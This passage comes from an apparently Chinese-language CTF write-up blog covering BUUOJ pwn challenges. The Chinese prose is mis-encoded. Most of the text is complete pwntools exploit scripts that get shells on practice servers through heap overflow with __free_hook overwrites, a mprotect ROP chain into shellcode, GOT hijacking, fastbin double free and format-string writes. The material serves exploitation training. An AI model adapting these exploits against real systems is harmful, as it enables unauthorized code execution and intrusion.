<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26338</span>)<span class="comment">#process(&#x27;./npuctf_2020_easyheap&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./npuctf_2020_easyheap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap(0x10 or 0x20 only) : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">0x18</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        edit(i, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">3</span> + p8(<span class="number">0xa1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">8</span> - i)</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        new(<span class="number">0x18</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    dump(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x38</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    edit(<span class="number">6</span>, p64(<span class="number">0xdeadbeef</span>) +  p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">6</span>, p64(<span class="number">0xdeadbeef</span>) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/LvNozJGHDm9hMn7.png" alt="image.png"></p>
<h2 id="0x04E-picoctf-2018-can-you-gets-me-ret2text-ret2shellcode"><a href="#0x04E-picoctf-2018-can-you-gets-me-ret2text-ret2shellcode" class="headerlink" title="0x04E.picoctf_2018_can_you_gets_me - ret2text + ret2shellcode"></a>0x04E.picoctf_2018_can_you_gets_me - ret2text + ret2shellcode</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/04/07/QHLKRI1Bghm7fV8.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>é™æ€ç¼–è¯‘ï¼Œgets()æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/07/SNuvxtamnPgpwLA.png" alt="image.png"></p>
<p>å¥—æ¿å­mprotect + shellcodeï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29207</span>)<span class="comment">#process(&#x27;./PicoCTF_2018_can-you-gets-me&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)</span><br><span class="line">sc_addr = (e.bss() + <span class="number">0x1000</span>) &amp; <span class="number">0xfffff000</span></span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = e.search(asm(<span class="string">&#x27;pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#x27;</span>)).__next__()</span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/crKuiFajY9N2RkQ.png" alt="image.png"></p>
<h2 id="0x04F-picoctf-2018-got-shell-got-hijack"><a href="#0x04F-picoctf-2018-got-shell-got-hijack" class="headerlink" title="0x04F.picoctf_2018_got_shell - got hijack"></a>0x04F.picoctf_2018_got_shell - got hijack</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/04/07/Oovbe7JY8xfSspc.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>ä»»æ„åœ°å€å†™4å­—èŠ‚</p>
<p><img src="https://i.loli.net/2021/04/07/3eAbC4TZRVpSXg2.png" alt="image.png"></p>
<p>æœ‰åé—¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/04/07/DasloJIrKb4TnXd.png" alt="image.png"></p>
<p>exiçš„gotæ”¹ä¸ºåé—¨å‡½æ•°åœ°å€å³å¯ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25413</span>)<span class="comment">#process(&#x27;./PicoCTF_2018_got-shell&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(e.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(e.sym[<span class="string">&#x27;win&#x27;</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/ZgCYStkDpJNlMXj.png" alt="image.png"></p>
<h2 id="0x050-gyctf-2020-some-thing-exceting-Use-After-Free-Fastbin-double-free"><a href="#0x050-gyctf-2020-some-thing-exceting-Use-After-Free-Fastbin-double-free" class="headerlink" title="0x050.gyctf_2020_some_thing_exceting - Use After Free + Fastbin double free"></a>0x050.gyctf_2020_some_thing_exceting - Use After Free + Fastbin double free</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œé™¤äº†PIEä»¥å¤–çš„ä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/07/4Y6NnkQUM8A5usa.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯æœ‰ç€åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½ï¼Œç¼–è¾‘åŠŸèƒ½ä¸å¯ç”¨</p>
<p><img src="https://i.loli.net/2021/04/07/aBDoznpRVg1vb7F.png" alt="image.png"></p>
<p>åˆå§‹åŒ–æ—¶ä¼šå°†flagè¯»å…¥åˆ°bssæ®µä¸Šï¼Œä¸”å°†bssæ®µä¸ŠæŸä¸ªå­—èŠ‚è®¾ä¸º 0x60 ï¼ˆæš—ç¤ºï¼ˆ<del>æ˜ç¤º</del>ï¼‰åœ¨ bss ä¸Šæ„é€  fake chunkï¼‰</p>
<p><img src="https://i.loli.net/2021/04/07/pYJlGNnMDrxKbAP.png" alt="image.png"></p>
<p>ä¸€æ¬¡ä¼šåˆ†é…ä¸‰ä¸ªchunkï¼Œä¸€ä¸ªå°chunkç”¨æ¥è£…ç”¨æˆ·çš„ä¸¤ä¸ªchunkï¼Œé™åˆ¶äº†å¤§å°ä¸èƒ½å¤§äº0x70</p>
<p><img src="https://i.loli.net/2021/04/07/aYF4JCku6nxGdrW.png" alt="image.png"></p>
<p>å­˜åœ¨UAF</p>
<p><img src="https://i.loli.net/2021/04/07/RAnJHscQtuhoymB.png" alt="image.png"></p>
<p>é‚£å°±é€šè¿‡fastbin double freeè·å–ä¸€ä¸ªä½äºbssæ®µä¸Šçš„chunkåæ‰“å°å°±æœ‰flagäº†</p>
<p>expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28556</span>)<span class="comment">#process(&#x27;./gyctf_2020_some_thing_exceting&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Now please tell me what you want to do :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size1:<span class="built_in">int</span>, content1, size2:<span class="built_in">int</span>, content2</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; ba&#x27;s length : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size1).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; ba : &quot;</span>)</span><br><span class="line">    p.send(content1)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; na&#x27;s length : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size2).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; na : &quot;</span>)</span><br><span class="line">    p.send(content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Banana ID : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; SCP project ID : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, p64(<span class="number">0x6020a0</span> - <span class="number">0x8</span>), <span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="number">0x50</span>, <span class="string">b&#x27;f&#x27;</span>)</span><br><span class="line">    dump(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/04/07/oC5E8IGLjtzpycM.png" alt="image.png"></p>
<h1 id="0x051-0x060"><a href="#0x051-0x060" class="headerlink" title="0x051 ~ 0x060"></a>0x051 ~ 0x060</h1><h2 id="0x051-axb-2019-brop64-ret2libc-BROP"><a href="#0x051-axb-2019-brop64-ret2libc-BROP" class="headerlink" title="0x051.axb_2019_brop64 - ret2libc | BROP"></a>0x051.axb_2019_brop64 - ret2libc | BROP</h2><p>åŸé¢˜æ˜¯Blind pwnï¼Œä¸è¿‡buuä¸Šç»™äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£è¿™é“é¢˜å°±ç”¨ä¸¤ç§æ–¹æ³•æ¥åšåš</p>
<h3 id="è§£æ³•ä¸€ï¼šret2libc-1"><a href="#è§£æ³•ä¸€ï¼šret2libc-1" class="headerlink" title="è§£æ³•ä¸€ï¼šret2libc"></a>è§£æ³•ä¸€ï¼šret2libc</h3><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/04/07/elBZODv7jsPJgf2.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>æœ‰æº¢å‡ºï¼Œæœ‰è¾“å‡ºï¼Œå¥—æ¿å­ret2libc</p>
<p><img src="https://i.loli.net/2021/04/07/lVjKkxifayvrXMp.png" alt="image.png"></p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27522</span>)<span class="comment">#process(&#x27;./axb_2019_brop64&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./axb_2019_brop64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line">offset = <span class="number">0xd0</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_pop_r15_ret = e.search(asm(<span class="string">&#x27;pop rsi ; pop r15 ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(e.got[<span class="string">&#x27;read&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/joiKH6vU5wXtBZq.png" alt="image.png"></p>
<h3 id="è§£æ³•äºŒï¼šBROP-1"><a href="#è§£æ³•äºŒï¼šBROP-1" class="headerlink" title="è§£æ³•äºŒï¼šBROP"></a>è§£æ³•äºŒï¼šBROP</h3><blockquote>
<p>å…ˆğŸ•Š</p>
</blockquote>
<h2 id="0x052-axb-2019-fmt64-fmtstr-got-hijack"><a href="#0x052-axb-2019-fmt64-fmtstr-got-hijack" class="headerlink" title="0x052.axb_2019_fmt64 - fmtstr + got hijack"></a>0x052.axb_2019_fmt64 - fmtstr + got hijack</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/04/07/aiLvs1OIQcMG2BV.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>ä¸é™åˆ¶æ¬¡æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://i.loli.net/2021/04/07/ysBY9SrjL6ap7eI.png" alt="image.png"></p>
<p>ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å¤§æ¦‚æ˜¯ä½äºæ ˆä¸Šçš„ç¬¬ 8 ä¸ªå‚æ•°</p>
<p><img src="https://i.loli.net/2021/04/07/iCqZYVsRQDEzg8m.png" alt="image.png"></p>
<p>å¤§æ¦‚æ€è·¯æ˜¯åˆ©ç”¨gotè¡¨æ³„éœ² libc åŸºå€ï¼Œæ”¹ printf çš„ got è¡¨ä¸º system å³å¯</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25296</span>)<span class="comment">#process(&#x27;./axb_2019_fmt64&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./axb_2019_fmt64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_pop_r15_ret = e.search(asm(<span class="string">&#x27;pop rsi ; pop r15 ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;%9$s\x00\x00\x00\x00&#x27;</span> + p64(e.got[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_got = e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_low = sys_addr &amp; <span class="number">0xffff</span></span><br><span class="line">sys_high = (sys_addr &gt;&gt; <span class="number">16</span>)  &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(sys_high - <span class="number">9</span>).encode() + <span class="string">b&#x27;c%12$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(sys_low - sys_high).encode() + <span class="string">b&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">4</span> * <span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">2</span>)</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = fmtstr_payload(8, &#123;printf_got:sys_addr&#125;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/04/07/6yck1Kfd5aRMBFr.png" alt="image.png"></p>
